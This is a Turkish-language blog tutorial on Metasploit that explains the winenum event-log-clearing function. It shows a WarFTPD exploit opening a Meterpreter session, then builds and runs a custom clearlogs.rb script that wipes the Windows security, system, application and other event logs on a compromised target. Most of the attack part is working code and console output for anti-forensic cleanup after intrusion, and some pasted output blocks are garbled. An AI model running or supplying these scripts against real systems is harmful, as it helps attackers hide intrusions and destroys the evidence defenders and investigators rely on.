---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:21:00Z"
excerpt: Bazen hedef bilgisayarda yaptığınız işlemlerin log kayıtlarını temizlemek
  isteyebilirsiniz. Bu temizleme işlemi için öncelikle meterpreter in sağladığıwinenumscript
  kodlarının nasıl çalıştığına bakalım. Script dosyasını Metasploit Framework klasörünüzün
  altında/usr/share/metasploit-framework/scripts/meterpreter/winenum.rbadresinde
  bulabilirsiniz. Bu dosya içerisinde bir çok bölüm bulunmaktadır. Biz şimdilik sadece#
  Function for clearing all event logskısmıyla ilgileneceğiz.
guid: https://www.siberoloji.com/?p=1181
id: 1181
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Log Yönetimi
url: /tr/msf-log-yonetimi/
---

  Bazen hedef bilgisayarda yaptığınız işlemlerin log kayıtlarını temizlemek isteyebilirsiniz. Bu temizleme işlemi için öncelikle meterpreter in sağladığı&nbsp;<code>winenum</code>&nbsp;script kodlarının nasıl çalıştığına bakalım. Script dosyasını Metasploit Framework klasörünüzün altında&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter/winenum.rb</code>&nbsp;adresinde bulabilirsiniz. Bu dosya içerisinde bir çok bölüm bulunmaktadır. Biz şimdilik sadece&nbsp;<code># Function for clearing all event logs</code>&nbsp;kısmıyla ilgileneceğiz.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash"><em># Function for clearing all event logs</em>
def clrevtlgs***()*** 
  evtlogs ***=***  ***[*** 
    'security',
    'system',
    'application',
    'directory service',
    'dns server',
    'file replication service'
  ***]*** 
  print_status***(*** "Clearing Event Logs, this will leave and event 517"***)*** 
  begin
    evtlogs.each ***do***  |evl|
      print_status***(*** "\tClearing the #{evl} Event Log"***)*** 
      log ***=***  @client.sys.eventlog.open***(*** evl***)*** 
      log.clear
      file_local_write***(*** @dest,"Cleared the #{evl} Event Log"***)*** 
    end
    print_status***(*** "All Event Logs have been cleared"***)*** 
  rescue ::Exception ***=&gt;***  e
    print_status***(*** "Error clearing Event Log: #{e.class} #{e}"***)*** 

  end
end
</code></pre>
<!-- /wp:code -->

  Programlama ile ilgilenenler kodları ve fonksiyonun nasıl çalıştığını rahatlıkla anlayacaktır. Yukarıdaki kodların ne işe yaradığını özetle açıklayalım.&nbsp;<code>evtlogs.each do |evl|</code>&nbsp;döngüsü, Windows’a ait ‘security’, ‘system’, ‘application’, ‘directory service’, ‘dns server’ ve ‘file replication service’ loglarını sırasıyla açar ve temizler.
 

  Şimdi, hazır script yerine yukarıdaki dosyadan örnek alarak kendi script kodumuzu oluşturalım ve kaydedelim. Bunun için Meterpreter içnde Ruby kodlamayı kullanacağız. Temizlikten önce Windows Log durumunu aşağıdaki resimden görebilirsiniz.
 

<!-- wp:image {"id":1001,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/assets/images/2024/06/Eventlog-00.png" alt="" class="wp-image-1001" /></figure>
<!-- /wp:image -->

  Biz sadece ‘system’ loglarını temizlemek istediğimizden yukarıdaki döngü içerisinden sadece&nbsp;<code>log = client.sys.eventlog.open(‘system’)</code>&nbsp;durumunu kullanacağız.
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="bu-kısımda-deneme-yapıyoruz">Bu kısımda deneme yapıyoruz 
<!-- /wp:heading -->

  Öncelikle hedef bilgisayarda bir meterpreter shell açmış olmalıyız.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** warftpd_165_user***)***  ***&gt;***  exploit

***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
***[*** ******* ***]***  Started reverse handler
***[*** ******* ***]***  Connecting to FTP server 172.16.104.145:21...
***[*** ******* ***]***  Connected to target FTP server.
***[*** ******* ***]***  Trying target Windows 2000 SP0-SP4 English...
***[*** ******* ***]***  Transmitting intermediate stager ***for *** over-sized stage...***(*** 191 bytes***)*** 
***[*** ******* ***]***  Sending stage ***(*** 2650 bytes***)*** 
***[*** ******* ***]***  Sleeping before handling stage...
***[*** ******* ***]***  Uploading DLL ***(*** 75787 bytes***)*** ...
***[*** ******* ***]***  Upload completed.
***[*** ******* ***]***  Meterpreter session 2 opened ***(*** 172.16.104.130:4444 -&gt; 172.16.104.145:1246***)*** 
</code></pre>
<!-- /wp:code -->

  Ardından meterpreter shell içerisinden Ruby kodlayıcısını&nbsp;<code>irb</code>&nbsp;komutuyla çalıştırıyoruz ve aşağıdaki kodları yapıştırıyoruz.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  irb
***[*** ******* ***]***  Starting IRB shell
***[*** ******* ***]***  The 'client' variable holds the meterpreter client
***&gt;&gt;***  log ***=***  client.sys.eventlog.open***(*** 'system'***)*** 
***=&gt;***  <em>#&gt;#:0xb6779424 @client=#&gt;, #&gt;, #</em>

"windows/browser/facebook_extractiptc"***=&gt;*** <em>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=&gt;#, "windows/browser/ie_iscomponentinstalled"=&gt;#, "windows/exec/reverse_ord_tcp"=&gt;#, "windows/http/apache_chunked"=&gt;#, "windows/imap/novell_netmail_append"=&gt;#</em>
</code></pre>
<!-- /wp:code -->

  Şimdi, meterpreter içerisinde&nbsp;<code>log.clear</code>&nbsp;komutuyla logların temizlenip temizlenmediğini kontrol edelim.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">***&gt;&gt;***  log.clear
***=&gt;***  <em>#&gt;#:0xb6779424 @client=#&gt;,</em>

/trendmicro_serverprotect_earthagent"=&gt;#, "windows/browser/ie_iscomponentinstalled"=&gt;#, "windows/exec/reverse_ord_tcp"=&gt;#, "windows/http/apache_chunked"=&gt;#, "windows/imap/novell_netmail_append"=&gt;#
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":1002,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/assets/images/2024/06/Eventlog-01.png" alt="" class="wp-image-1002" /></figure>
<!-- /wp:image -->

  Meterpreter içerisinde Ruby kodlayıcısı kullanarak basit bir log temizleme denemesi yaptık ve yaptığımız kontrolde başarılı olduk. Bu yaklaşımı kullanarak kendi Script kodlarımızı yazabiliriz.
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="tüm-logları-temizleme">Tüm Logları Temizleme 
<!-- /wp:heading -->

  Aşağıdaki kodları bir dosyaya yazarak&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter/</code>&nbsp;klasörüne&nbsp;<code>clearlogs.rb</code>&nbsp;adıyla kaydedin.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">evtlogs ***=***  ***[*** 
        'security',
        'system',
        'application',
        'directory service',
        'dns server',
        'file replication service'
        ***]*** 
print_line***(*** "Clearing Event Logs, this will leave an event 517"***)*** 
evtlogs.each ***do***  |evl|
        print_status***(*** "Clearing the #{evl} Event Log"***)*** 
        log ***=***  client.sys.eventlog.open***(*** evl***)*** 
        log.clear
end
print_line***(*** "All Clear! You are a Ninja!"***)*** 
</code></pre>
<!-- /wp:code -->

  Artık bu yeni oluşturduğunuz Script kodlarını yeni açtığınız Meterpreter oturumlarında çalıştırabilirsiniz.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf exploit***(*** warftpd_165_user***)***  ***&gt;***  exploit

***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
***[*** ******* ***]***  Started reverse handler
***[*** ******* ***]***  Connecting to FTP server 172.16.104.145:21...
***[*** ******* ***]***  Connected to target FTP server.
***[*** ******* ***]***  Trying target Windows 2000 SP0-SP4 English...
***[*** ******* ***]***  Transmitting intermediate stager ***for *** over-sized stage...***(*** 191 bytes***)*** 
***[*** ******* ***]***  Sending stage ***(*** 2650 bytes***)*** 
***[*** ******* ***]***  Sleeping before handling stage...
***[*** ******* ***]***  Uploading DLL ***(*** 75787 bytes***)*** ...
***[*** ******* ***]***  Upload completed.
***[*** ******* ***]***  Meterpreter session 1 opened ***(*** 172.16.104.130:4444 -&gt; 172.16.104.145:1253***)*** 

meterpreter ***&gt;***  run clearlogs
Clearing Event Logs, this will leave an event 517
***[*** ******* ***]***  Clearing the security Event Log
***[*** ******* ***]***  Clearing the system Event Log
***[*** ******* ***]***  Clearing the application Event Log
***[*** ******* ***]***  Clearing the directory service Event Log
***[*** ******* ***]***  Clearing the dns server Event Log
***[*** ******* ***]***  Clearing the file replication service Event Log
All Clear! You are a Ninja!
meterpreter ***&gt;***  exit
</code></pre>
<!-- /wp:code -->

  Aşağıdaki resimde görüldüğü gibi tüm loglar temizlenmiştir. Geriye sadece 517 numaralı işlem kalmıştır. O işlemde halen meterpreter’in çalıştığı proses olduğundan halen aktif durumdadır.
 

<!-- wp:image {"id":1003,"sizeSlug":"full","linkDestination":"none"} -->
<figure class="wp-block-image size-full"><img src="https://www.siberoloji.com/assets/images/2024/06/Eventlog-03.png" alt="" class="wp-image-1003" /></figure>
<!-- /wp:image -->

  Bu yazıda, Metasploit Framework içerisinde bulunan Scriptleri örnek alarak kendi script dosyamızı yazmayı ve log temizlemeyi göstermeye çalıştık.&nbsp;<code>/usr/share/metasploit-framework/scripts/meterpreter/</code>&nbsp;klasöründe bulunan diğer script dosyalarını da incelemenizi tavsiye ediyoruz. Bu sayede elinizdeki imkanları da öğrenmiş olacaksınız.
 